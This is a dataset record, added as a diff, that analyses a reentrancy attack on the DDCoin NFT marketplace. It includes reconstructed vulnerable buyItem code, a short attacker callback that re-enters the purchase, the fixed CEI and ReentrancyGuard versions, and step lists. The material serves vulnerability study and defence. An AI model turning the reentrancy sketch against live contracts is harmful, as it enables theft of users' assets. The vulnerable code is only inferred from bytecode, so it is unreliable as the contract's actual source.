@@ -1,0 +1,39 @@
+{
+ "id": "2023__2023-06-01_DDCoin_MarketplaceReentrancy",
+ "source_file": "2023/2023-06-01_DDCoin_MarketplaceReentrancy.md",
+ "title": "DDCoin — NFT Marketplace Reentrancy Attack Analysis",
+ "date": "2023-06-01",
+ "protocol": "DDCoin NFT Marketplace",
+ "chain": "BSC",
+ "loss_raw": "~300K USD",
+ "loss_usd": null,
+ "root_cause": "Reentrancy possible during SellListing processing in NFT Marketplace",
+ "attack_tx": "0xd92bf51b...",
+ "vulnerable_contract": "0xb3a636ac...",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "// ❌ CEI pattern violation: external call before state update\ninterface IMarketPlace {\n    struct SellListing {\n        uint256 itemId;\n        uint256 index;\n    }\n\n    // ❌ No state change before NFT transfer → reentrancy possible\n    function buyItem(uint256 itemId) external;\n}\n\n// Vulnerable buyItem implementation (inferred)\nfunction buyItem(uint256 itemId) external {\n    SellListing storage listing = listings[itemId];\n    require(listing.active, \"Not active\");\n\n    // ❌ Payment transfer (external call 1)\n    paymentToken.transferFrom(msg.sender, seller, listing.price);\n\n    // ❌ NFT transfer — triggers onERC721Received callback\n    // listing.active is still true at this point\n    nft.safeTransferFrom(address(this), msg.sender, listing.tokenId);\n\n    // ❌ State update after NFT transfer — too late\n    listing.active = false;\n}",
+  "function attack(uint256 itemId) external {\n    // 1. Initiate first purchase\n    marketplace.buyItem(itemId);\n}\n\n// NFT receipt callback — reentrancy entry point\nfunction onERC721Received(\n    address, address, uint256 tokenId, bytes calldata\n) external returns (bytes4) {\n    if (attackCount < MAX_REENTER) {\n        attackCount++;\n        // ❌ listing.active still true → reentrancy possible\n        marketplace.buyItem(itemId);  // reenter\n    }\n    return this.onERC721Received.selector;\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: Follow CEI pattern\nfunction buyItem(uint256 itemId) external nonReentrant {\n    SellListing storage listing = listings[itemId];\n    require(listing.active, \"Not active\");\n\n    // ✅ Update state first (Effects)\n    listing.active = false;\n\n    // ✅ External calls after (Interactions)\n    paymentToken.transferFrom(msg.sender, seller, listing.price);\n    nft.safeTransferFrom(address(this), msg.sender, listing.tokenId);\n}",
+  "// ✅ ReentrancyGuard + CEI pattern\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nfunction buyItem(uint256 itemId) external nonReentrant {\n    listings[itemId].active = false; // Effects first\n    // Interactions after\n}"
+ ],
+ "steps": [
+  "1. Deploy attack contract (onERC721Received)",
+  "2. Call buyItem(itemId)",
+  "Payment sent → NFT transfer begins",
+  "3. onERC721Received callback triggered",
+  "→ Reenter: call buyItem(itemId) again",
+  "→ listing.active still true",
+  "→ Double purchase succeeds",
+  "4. Repeated reentrancy drains NFTs",
+  "→ 300K USD profit"
+ ],
+ "other_code": [
+  "// Root cause: Reentrancy possible during SellListing processing in NFT Marketplace\n// Source code unverified — based on bytecode analysis",
+  "┌──────────────────────────────────────────┐\n│  1. Deploy attack contract (onERC721Received) │\n└──────────────────────┬───────────────────┘\n                       ▼\n┌──────────────────────────────────────────┐\n│  2. Call buyItem(itemId)                 │\n│     Payment sent → NFT transfer begins   │\n└──────────────────────┬───────────────────┘\n                       ▼\n┌──────────────────────────────────────────┐\n│  3. onERC721Received callback triggered  │\n│     → Reenter: call buyItem(itemId) again│\n│     → listing.active still true          │\n│     → Double purchase succeeds           │\n└──────────────────────┬───────────────────┘\n                       ▼\n┌──────────────────────────────────────────┐\n│  4. Repeated reentrancy drains NFTs      │\n│     → 300K USD profit                    │\n"
+ ]
+}
